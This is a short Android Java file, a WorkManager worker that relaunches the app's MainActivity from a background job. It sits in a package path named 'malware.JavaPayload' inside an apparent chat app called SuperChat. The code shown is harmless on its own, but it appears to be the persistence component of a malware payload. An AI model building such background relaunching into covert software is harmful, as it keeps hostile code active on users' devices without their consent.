package com.teamxdevelopers.SuperChat.malware.JavaPayload;

import android.content.Context;
import android.content.Intent;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import android.util.Log;

public class StartMainActivityWorker extends Worker {
    private static final String TAG = "StartMainActivityWorker";

    public StartMainActivityWorker(
            @NonNull Context context,
            @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        // Log that doWork() has been called
        Log.d(TAG, "Attempting to start MainActivity...");

        // Start the MainActivity here
        Intent mainIntent = new Intent(getApplicationContext(), MainActivity.class);
        mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        getApplicationContext().startActivity(mainIntent);

        // Log successful start
        Log.d(TAG, "MainActivity has been started.");

        return Result.success();
    }
}

